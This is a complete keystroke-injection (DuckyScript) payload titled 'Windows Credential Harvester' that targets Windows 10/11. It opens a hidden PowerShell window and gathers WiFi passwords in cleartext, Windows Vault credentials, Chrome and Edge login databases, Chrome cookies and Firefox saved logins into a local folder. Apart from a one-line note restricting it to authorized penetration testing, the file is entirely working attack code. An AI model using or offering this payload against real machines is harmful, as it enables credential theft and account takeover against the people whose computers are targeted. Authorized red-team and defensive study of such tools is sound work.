REM Title: Windows Credential Harvester
REM Author: David Osisek (CamoZeroDay)
REM Target: Windows 10/11
REM Version: 1.0
REM Category: Credential Access
REM
REM ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
REM Collects WiFi passwords, browser creds, Windows Vault

DELAY 1000

REM Open PowerShell
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1500

REM Create output directory
STRING $out='C:\temp\creds'
ENTER
STRING New-Item -ItemType Directory -Force -Path $out
ENTER
DELAY 500

REM WiFi Passwords
STRING netsh wlan export profile key=clear folder="$out\wifi"
ENTER
DELAY 2000

REM Windows Vault
STRING vaultcmd /listcreds:'Windows Credentials' /all > "$out\vault.txt"
ENTER
DELAY 1000

REM Chrome Passwords (copy database)
STRING $chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
ENTER
STRING if(Test-Path $chrome){Copy-Item $chrome "$out\chrome_login.db"}
ENTER
DELAY 2000

REM Chrome Cookies
STRING $cookies="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
ENTER
STRING if(Test-Path $cookies){Copy-Item $cookies "$out\chrome_cookies.db"}
ENTER
DELAY 2000

REM Edge Passwords
STRING $edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
ENTER
STRING if(Test-Path $edge){Copy-Item $edge "$out\edge_login.db"}
ENTER
DELAY 2000

REM Firefox Profiles
STRING $ff=Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" -ErrorAction SilentlyContinue
ENTER
STRING if($ff){Copy-Item $ff.FullName "$out\firefox_logins.json"}
ENTER
DELAY 2000

REM Summary
STRING "Credential Collection Complete" | Out-File "$out\README.txt"
ENTER
STRING "Date: $(Get-Date)" | Out-File -Append "$out\README.txt"
ENTER
STRING "Computer: $env:COMPUTERNAME" | Out-File -Append "$out\README.txt"
ENTER
DELAY 500

REM Exit
STRING exit
ENTER
